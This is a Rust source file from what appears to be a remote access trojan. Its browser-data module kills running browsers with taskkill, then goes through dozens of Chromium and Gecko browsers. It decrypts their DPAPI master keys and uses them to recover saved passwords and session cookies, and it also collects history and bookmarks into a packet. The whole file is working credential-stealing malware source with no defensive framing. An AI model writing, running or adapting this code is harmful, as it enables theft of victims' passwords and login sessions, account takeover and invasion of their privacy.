use std::path::{Path, PathBuf};
use std::fs;
use std::sync::mpsc;
use std::thread;
use std::time::Duration;
use rusqlite::{Connection, OpenFlags};
use common::packets::{BrowserResult, PasswordEntry, CookieEntry, HistoryEntry, BookmarkEntry, BrowserData};
use aes_gcm::{Aes256Gcm, Key, Nonce, aead::Aead, KeyInit};
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::DATA_BLOB;
use std::ptr;
use base64::{Engine as _, engine::general_purpose};
use crate::features::firefox::FirefoxPasswordExtractor;

const BROWSER_PROCESSES: &[&str] = &[
    "chrome.exe", "msedge.exe", "brave.exe", "vivaldi.exe",
    "opera.exe", "operagx.exe", "firefox.exe",
];

fn kill_browser_processes() {
    for proc_name in BROWSER_PROCESSES {
        let output = std::process::Command::new("taskkill")
            .args(&["/F", "/IM", proc_name, "/T"])
            .output();
        if let Ok(out) = output {
            if out.status.success() {
                println!("[BrowserData] Killed {}", proc_name);
            }
        }
    }
    // Give processes a moment to release file locks
    std::thread::sleep(std::time::Duration::from_millis(500));
}

// Browser path configuration
// Paths ending with "\\" have a "User Data" subfolder
// Paths without "\\" are the data directories themselves
// Opera stores data in Roaming instead of Local
struct BrowserInfo {
    name: &'static str,
    base_path: &'static str,
    is_roaming: bool, // true if data is in APPDATA instead of LOCALAPPDATA
}

const BROWSERS: &[BrowserInfo] = &[
    BrowserInfo { name: "Chrome", base_path: "Google\\Chrome\\", is_roaming: false },
    BrowserInfo { name: "Edge", base_path: "Microsoft\\Edge\\", is_roaming: false },
    BrowserInfo { name: "Brave", base_path: "BraveSoftware\\Brave-Browser\\", is_roaming: false },
    BrowserInfo { name: "Vivaldi", base_path: "Vivaldi\\", is_roaming: false },
    BrowserInfo { name: "Opera", base_path: "Opera Software\\Opera Stable", is_roaming: true },
    BrowserInfo { name: "Opera GX", base_path: "Opera Software\\Opera GX Stable", is_roaming: true },
    BrowserInfo { name: "Chromium", base_path: "Chromium\\", is_roaming: false },
    BrowserInfo { name: "CentBrowser", base_path: "CentBrowser\\", is_roaming: false },
    BrowserInfo { name: "Orbitum", base_path: "Orbitum\\", is_roaming: false },
    BrowserInfo { name: "Comodo Dragon", base_path: "Comodo\\Dragon\\", is_roaming: false },
    BrowserInfo { name: "Yandex", base_path: "Yandex\\YandexBrowser\\", is_roaming: false },
    BrowserInfo { name: "7Star", base_path: "7Star\\7Star\\", is_roaming: false },
    BrowserInfo { name: "Torch", base_path: "Torch\\", is_roaming: false },
    BrowserInfo { name: "Amigo", base_path: "Amigo\\", is_roaming: false },
    BrowserInfo { name: "Sputnik", base_path: "Sputnik\\Sputnik\\", is_roaming: false },
    BrowserInfo { name: "360Chrome", base_path: "360Chrome\\Chrome\\", is_roaming: false },
    BrowserInfo { name: "Uran", base_path: "uCozMedia\\Uran\\", is_roaming: false },
    BrowserInfo { name: "Epic Privacy Browser", base_path: "Epic Privacy Browser\\", is_roaming: false },
    BrowserInfo { name: "CocCoc", base_path: "CocCoc\\Browser\\", is_roaming: false },
    BrowserInfo { name: "Iridium", base_path: "Iridium\\", is_roaming: false },
    BrowserInfo { name: "Chedot", base_path: "Chedot\\", is_roaming: false },
    BrowserInfo { name: "liebao", base_path: "liebao\\", is_roaming: false },
    BrowserInfo { name: "Elements Browser", base_path: "Elements Browser\\", is_roaming: false },
    BrowserInfo { name: "Coowon", base_path: "Coowon\\Coowon\\", is_roaming: false },
];

pub fn get_browser_data() -> BrowserData {
    println!("[BrowserData] Starting browser data extraction");
    kill_browser_processes();
    let mut results = Vec::new();
    let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
    let roaming_appdata = std::env::var("APPDATA").unwrap_or_default();
    println!("[BrowserData] LOCALAPPDATA: {}", local_appdata);
    println!("[BrowserData] APPDATA: {}", roaming_appdata);

    for browser in BROWSERS {
        let base = if browser.is_roaming { &roaming_appdata } else { &local_appdata };
        
        // Paths ending with "\\" have a "User Data" subfolder
        let user_data_path = if browser.base_path.ends_with("\\") {
            PathBuf::from(base).join(browser.base_path).join("User Data")
        } else {
            PathBuf::from(base).join(browser.base_path)
        };
        
        println!("[BrowserData] Checking {} at {:?}", browser.name, user_data_path);
        if user_data_path.exists() {
            println!("[BrowserData] Found {} at {:?}", browser.name, user_data_path);
            // Use a timeout of 60 seconds per browser
            let (tx, rx) = mpsc::channel();
            let browser_name = browser.name.to_string();
            let browser_path = user_data_path.clone();
            
            thread::spawn(move || {
                let result = extract_from_browser(&browser_name, &browser_path);
                let _ = tx.send(result);
            });

            match rx.recv_timeout(Duration::from_secs(60)) {
                Ok(Some(data)) => {
                    println!("[BrowserData] Extracted data from {} ({} passwords, {} cookies, {} history, {} bookmarks)",
                        browser.name, data.passwords.len(), data.cookies.len(), data.history.len(), data.bookmarks.len());
                    results.push(data);
                }
                Ok(None) => {
                    println!("[BrowserData] No data extracted from {}", browser.name);
                }
                Err(_) => {
                    println!("[BrowserData] Timeout extracting {} (skipping)", browser.name);
                }
            }
        } else {
            println!("[BrowserData] {} not found at {:?}", browser.name, user_data_path);
        }
    }

    println!("[BrowserData] Total browsers extracted: {}", results.len());
    
    // Also extract Gecko/Firefox browser data
    let gecko_results = extract_gecko_data();
    println!("[BrowserData] Total Gecko browsers extracted: {}", gecko_results.len());
    results.extend(gecko_results);
    
    println!("[BrowserData] Final total browsers extracted: {}", results.len());
    BrowserData { browsers: results }
}

fn extract_from_browser(name: &str, path: &Path) -> Option<BrowserResult> {
    println!("[BrowserData] Extracting from {} at {:?}", name, path);
    let mut passwords = Vec::new();
    let mut cookies = Vec::new();
    let mut history = Vec::new();
    let mut bookmarks = Vec::new();
    
    let master_key = get_master_key(path);
    println!("[BrowserData] Master key for {}: {:?}", name, master_key.as_ref().map(|k| k.len()));

    // Dynamically discover profiles: Default, Profile 1, Profile 2, etc.
    let mut profiles = vec!["Default".to_string()];
    let mut profile_num = 1;
    loop {
        let profile_name = format!("Profile {}", profile_num);
        let profile_path = path.join(&profile_name);
        if profile_path.exists() {
            profiles.push(profile_name);
            profile_num += 1;
        } else {
            break;
        }
    }
    println!("[BrowserData] Found {} profiles for {}: {:?}", profiles.len(), name, profiles);

    for profile in &profiles {
        let profile_path = path.join(profile);
        if !profile_path.exists() { continue; }
        println!("[BrowserData] Processing profile {} for {}", profile, name);

        // Passwords
        if let Some(key) = &master_key {
            let login_db = profile_path.join("Login Data");
            if login_db.exists() {
                println!("[BrowserData] Extracting passwords from {}", profile);
                extract_passwords(&login_db, key, &mut passwords);
                println!("[BrowserData] Found {} passwords from {}", passwords.len(), profile);
            }

            let cookie_db = profile_path.join("Network").join("Cookies");
            let cookie_db_old = profile_path.join("Cookies");
            if cookie_db.exists() {
                println!("[BrowserData] Extracting cookies from {}", profile);
                extract_cookies(&cookie_db, key, &mut cookies);
                println!("[BrowserData] Found {} cookies from {}", cookies.len(), profile);
            } else if cookie_db_old.exists() {
                println!("[BrowserData] Extracting cookies from {} (old format)", profile);
                extract_cookies(&cookie_db_old, key, &mut cookies);
                println!("[BrowserData] Found {} cookies from {}", cookies.len(), profile);
            }
        }

        // History
        let history_db = profile_path.join("History");
        if history_db.exists() {
            println!("[BrowserData] Extracting history from {}", profile);
            extract_history(&history_db, &mut history);
            println!("[BrowserData] Found {} history entries from {}", history.len(), profile);
        }

        // Bookmarks
        let bookmark_file = profile_path.join("Bookmarks");
        if bookmark_file.exists() {
            println!("[BrowserData] Extracting bookmarks from {}", profile);
            extract_bookmarks(&bookmark_file, &mut bookmarks);
            println!("[BrowserData] Found {} bookmarks from {}", bookmarks.len(), profile);
        }
    }

    if passwords.is_empty() && cookies.is_empty() && history.is_empty() && bookmarks.is_empty() {
        None
    } else {
        Some(BrowserResult {
            name: name.to_string(),
            passwords,
            cookies,
            history,
            bookmarks,
        })
    }
}

fn get_master_key(path: &Path) -> Option<Vec<u8>> {
    let local_state_path = path.join("Local State");
    if !local_state_path.exists() { 
        println!("[BrowserData] Local State not found at {:?}", local_state_path);
        return None; 
    }

    let content = fs::read_to_string(&local_state_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&content).ok()?;
    
    // Try both key names - different browsers use different fields
    let encrypted_key_b64 = json["os_crypt"]["encrypted_key"]
        .as_str()
        .or_else(|| json["os_crypt"]["os_encrypted_key"].as_str());
    
    if encrypted_key_b64.is_none() {
        println!("[BrowserData] No encrypted key found in {:?}", local_state_path);
        println!("[BrowserData] os_crypt keys: {:?}", json["os_crypt"]);
        return None;
    }
    
    let encrypted_key_b64 = encrypted_key_b64.unwrap();
    let encrypted_key = general_purpose::STANDARD.decode(encrypted_key_b64).ok()?;

    // Key is DPAPI encrypted, starts with "DPAPI"
    if !encrypted_key.starts_with(b"DPAPI") { 
        println!("[BrowserData] Key does not start with DPAPI header");
        return None; 
    }
    let encrypted_key = &encrypted_key[5..];

    unsafe {
        let mut input = DATA_BLOB {
            cbData: encrypted_key.len() as u32,
            pbData: encrypted_key.as_ptr() as *mut _,
        };
        let mut output = DATA_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        if CryptUnprotectData(&mut input, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, &mut output) != 0 {
            let key = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            winapi::um::winbase::LocalFree(output.pbData as *mut _);
            println!("[BrowserData] Master key decrypted successfully ({} bytes)", key.len());
            Some(key)
        } else {
            println!("[BrowserData] CryptUnprotectData failed");
            None
        }
    }
}

fn decrypt_aes_gcm(data: &[u8], key: &[u8]) -> Option<String> {
    if data.len() < 15 { return None; }
    // data starts with "v10" or "v11"
    let nonce = &data[3..15];
    let ciphertext = &data[15..];
    
    let key = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce);

    cipher.decrypt(nonce, ciphertext).ok().and_then(|b| String::from_utf8(b).ok())
}

fn extract_passwords(db_path: &Path, master_key: &[u8], results: &mut Vec<PasswordEntry>) {
    // Copy DB to avoid lock
    let temp_db = std::env::temp_dir().join("rat_logins.db");
    if fs::copy(db_path, &temp_db).is_err() { return; }

    if let Ok(conn) = Connection::open_with_flags(&temp_db, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        let stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins").ok();
        if let Some(mut stmt) = stmt {
            let rows = stmt.query_map([], |row| {
                let url: String = row.get(0)?;
                let user: String = row.get(1)?;
                let pass_enc: Vec<u8> = row.get(2)?;
                Ok((url, user, pass_enc))
            }).ok();

            if let Some(rows) = rows {
                for row in rows.flatten() {
                    if let Some(pass) = decrypt_aes_gcm(&row.2, master_key) {
                        if !pass.is_empty() {
                            results.push(PasswordEntry {
                                url: row.0,
                                username: row.1,
                                password: pass,
                            });
                        }
                    }
                }
            }
        }
    }
    let _ = fs::remove_file(temp_db);
}

fn extract_cookies(db_path: &Path, master_key: &[u8], results: &mut Vec<CookieEntry>) {
    let temp_db = std::env::temp_dir().join("rat_cookies.db");
    if fs::copy(db_path, &temp_db).is_err() { return; }

    if let Ok(conn) = Connection::open_with_flags(&temp_db, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        let stmt = conn.prepare("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies").ok();
        if let Some(mut stmt) = stmt {
            let rows = stmt.query_map([], |row| {
                let host: String = row.get(0)?;
                let name: String = row.get(1)?;
                let val_enc: Vec<u8> = row.get(2)?;
                let path: String = row.get(3)?;
                let expires: i64 = row.get(4)?;
                Ok((host, name, val_enc, path, expires))
            }).ok();

            if let Some(rows) = rows {
                for row in rows.flatten() {
                    if let Some(val) = decrypt_aes_gcm(&row.2, master_key) {
                        results.push(CookieEntry {
                            domain: row.0,
                            name: row.1,
                            value: val,
                            path: row.3,
                            expires: row.4.to_string(),
                        });
                    }
                }
            }
        }
    }
    let _ = fs::remove_file(temp_db);
}

fn extract_history(db_path: &Path, results: &mut Vec<HistoryEntry>) {
    let temp_db = std::env::temp_dir().join("rat_history.db");
    if fs::copy(db_path, &temp_db).is_err() { return; }

    if let Ok(conn) = Connection::open_with_flags(&temp_db, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        let stmt = conn.prepare("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500").ok();
        if let Some(mut stmt) = stmt {
            let rows = stmt.query_map([], |row| {
                let url: String = row.get(0)?;
                let title: String = row.get(1)?;
                let count: i32 = row.get(2)?;
                let time: i64 = row.get(3)?;
                Ok(HistoryEntry {
                    url,
                    title,
                    visit_count: count,
                    last_visit: time.to_string(),
                })
            }).ok();

            if let Some(rows) = rows {
                for row in rows.flatten() {
                    results.push(row);
                }
            }
        }
    }
    let _ = fs::remove_file(temp_db);
}

fn extract_bookmarks(path: &Path, results: &mut Vec<BookmarkEntry>) {
    if let Ok(content) = fs::read_to_string(path) {
        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
            if let Some(roots) = json["roots"].as_object() {
                for (_, root) in roots {
                    parse_bookmark_node(root, results);
                }
            }
        }
    }
}

fn parse_bookmark_node(node: &serde_json::Value, results: &mut Vec<BookmarkEntry>) {
    if let Some(children) = node["children"].as_array() {
        for child in children {
            if let Some(url) = child["url"].as_str() {
                if let Some(name) = child["name"].as_str() {
                    results.push(BookmarkEntry {
                        url: url.to_string(),
                        title: name.to_string(),
                    });
                }
            }
            parse_bookmark_node(child, results);
        }
    }
}

// Firefox/Gecko browser extraction
// Based on BrowserSnatch's GeckoParser.cpp
const GECKO_BROWSERS: &[(&str, &str)] = &[
    ("Firefox", "Mozilla\\Firefox"),
    ("Thunderbird", "Thunderbird"),
    ("SeaMonkey", "Mozilla\\SeaMonkey"),
    ("BlackHawk", "NETGATE Technologies\\BlackHawk"),
    ("Cyberfox", "8pecxstudios\\Cyberfox"),
    ("K-Meleon", "K-Meleon"),
    ("IceCat", "Mozilla\\icecat"),
    ("Pale Moon", "Moonchild Productions\\Pale Moon"),
    ("IceDragon", "Comodo\\IceDragon"),
    ("Waterfox", "Waterfox"),
    ("Postbox", "Postbox"),
    ("Flock", "Flock\\Browser"),
];

pub fn extract_gecko_data() -> Vec<BrowserResult> {
    println!("[BrowserData] Starting Gecko/Firefox browser data extraction");
    let roaming = std::env::var("APPDATA").unwrap_or_default();
    let mut results = Vec::new();

    for (name, path_suffix) in GECKO_BROWSERS {
        let profiles_path = PathBuf::from(&roaming).join(path_suffix).join("Profiles");
        println!("[BrowserData] Checking {} profiles at {:?}", name, profiles_path);
        
        if !profiles_path.exists() || !profiles_path.is_dir() {
            println!("[BrowserData] {} profiles not found", name);
            continue;
        }

        if let Ok(entries) = fs::read_dir(&profiles_path) {
            for entry in entries.flatten() {
                let profile_path = entry.path();
                if !profile_path.is_dir() {
                    continue;
                }

                // Check if this profile has Firefox data files
                let has_logins = profile_path.join("logins.json").exists();
                let has_cookies = profile_path.join("cookies.sqlite").exists();
                let has_places = profile_path.join("places.sqlite").exists();

                if !has_logins && !has_cookies && !has_places {
                    continue;
                }

                println!("[BrowserData] Found {} profile at {:?}", name, profile_path);
                
                let mut passwords = Vec::new();
                let mut cookies = Vec::new();
                let mut history = Vec::new();
                let mut bookmarks = Vec::new();

                // Extract passwords from logins.json using NSS
                if has_logins {
                    println!("[BrowserData] Extracting passwords from {} profile using NSS", name);
                    let mut extractor = FirefoxPasswordExtractor::new();
                    if extractor.init_nss(&profile_path) {
                        passwords = extractor.extract_passwords_from_logins(&profile_path);
                        println!("[BrowserData] Found {} passwords from {} profile", passwords.len(), name);
                    } else {
                        println!("[BrowserData] Failed to initialize NSS for {} profile", name);
                    }
                }

                // Extract cookies (plaintext in Firefox)
                if has_cookies {
                    println!("[BrowserData] Extracting cookies from {} profile", name);
                    extract_gecko_cookies(&profile_path, &mut cookies);
                    println!("[BrowserData] Found {} cookies from {} profile", cookies.len(), name);
                }

                // Extract history and bookmarks from places.sqlite
                if has_places {
                    println!("[BrowserData] Extracting history from {} profile", name);
                    extract_gecko_history(&profile_path, &mut history);
                    println!("[BrowserData] Found {} history entries from {} profile", history.len(), name);

                    println!("[BrowserData] Extracting bookmarks from {} profile", name);
                    extract_gecko_bookmarks(&profile_path, &mut bookmarks);
                    println!("[BrowserData] Found {} bookmarks from {} profile", bookmarks.len(), name);
                }

                if !passwords.is_empty() || !cookies.is_empty() || !history.is_empty() || !bookmarks.is_empty() {
                    results.push(BrowserResult {
                        name: format!("{} ({})", name, profile_path.file_name().unwrap_or_default().to_string_lossy()),
                        passwords,
                        cookies,
                        history,
                        bookmarks,
                    });
                }
            }
        }
    }

    println!("[BrowserData] Total Gecko browsers extracted: {}", results.len());
    results
}

fn extract_gecko_cookies(profile_path: &Path, results: &mut Vec<CookieEntry>) {
    let cookie_db = profile_path.join("cookies.sqlite");
    if !cookie_db.exists() { return; }

    // Copy DB to avoid lock
    let temp_db = std::env::temp_dir().join("rat_gecko_cookies.db");
    if fs::copy(&cookie_db, &temp_db).is_err() { return; }

    if let Ok(conn) = Connection::open_with_flags(&temp_db, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        // Firefox uses different column names than Chromium
        let stmt = conn.prepare("SELECT host, name, value, path, expiry FROM moz_cookies").ok();
        if let Some(mut stmt) = stmt {
            let rows = stmt.query_map([], |row| {
                let host: String = row.get(0)?;
                let name: String = row.get(1)?;
                let value: String = row.get(2)?;
                let path: String = row.get(3)?;
                let expiry: i64 = row.get(4)?;
                Ok((host, name, value, path, expiry))
            }).ok();

            if let Some(rows) = rows {
                for row in rows.flatten() {
                    results.push(CookieEntry {
                        domain: row.0,
                        name: row.1,
                        value: row.2,
                        path: row.3,
                        expires: row.4.to_string(),
                    });
                }
            }
        }
    }
    let _ = fs::remove_file(temp_db);
}

fn extract_gecko_history(profile_path: &Path, results: &mut Vec<HistoryEntry>) {
    let places_db = profile_path.join("places.sqlite");
    if !places_db.exists() { return; }

    // Copy DB to avoid lock
    let temp_db = std::env::temp_dir().join("rat_gecko_history.db");
    if fs::copy(&places_db, &temp_db).is_err() { return; }

    if let Ok(conn) = Connection::open_with_flags(&temp_db, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        // Firefox stores history in moz_places table
        let stmt = conn.prepare("SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE url LIKE 'http%' ORDER BY last_visit_date DESC LIMIT 500").ok();
        if let Some(mut stmt) = stmt {
            let rows = stmt.query_map([], |row| {
                let url: String = row.get(0)?;
                let title: String = row.get(1).unwrap_or_default();
                let count: i32 = row.get(2).unwrap_or(0);
                let time: i64 = row.get(3).unwrap_or(0);
                Ok(HistoryEntry {
                    url,
                    title,
                    visit_count: count,
                    last_visit: time.to_string(),
                })
            }).ok();

            if let Some(rows) = rows {
                for row in rows.flatten() {
                    results.push(row);
                }
            }
        }
    }
    let _ = fs::remove_file(temp_db);
}

fn extract_gecko_bookmarks(profile_path: &Path, results: &mut Vec<BookmarkEntry>) {
    let places_db = profile_path.join("places.sqlite");
    if !places_db.exists() { return; }

    // Copy DB to avoid lock
    let temp_db = std::env::temp_dir().join("rat_gecko_bookmarks.db");
    if fs::copy(&places_db, &temp_db).is_err() { return; }

    if let Ok(conn) = Connection::open_with_flags(&temp_db, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        // Firefox bookmarks are in moz_bookmarks, need to join with moz_places for URLs
        let stmt = conn.prepare(
            "SELECT b.title, p.url, b.dateAdded 
             FROM moz_bookmarks b 
             JOIN moz_places p ON b.fk = p.id 
             WHERE b.type = 1 AND p.url LIKE 'http%'"
        ).ok();
        
        if let Some(mut stmt) = stmt {
            let rows = stmt.query_map([], |row| {
                let title: String = row.get(0).unwrap_or_default();
                let url: String = row.get(1)?;
                let _date_added: i64 = row.get(2).unwrap_or(0);
                Ok(BookmarkEntry {
                    url,
                    title,
                })
            }).ok();

            if let Some(rows) = rows {
                for row in rows.flatten() {
                    results.push(row);
                }
            }
        }
    }
    let _ = fs::remove_file(temp_db);
}
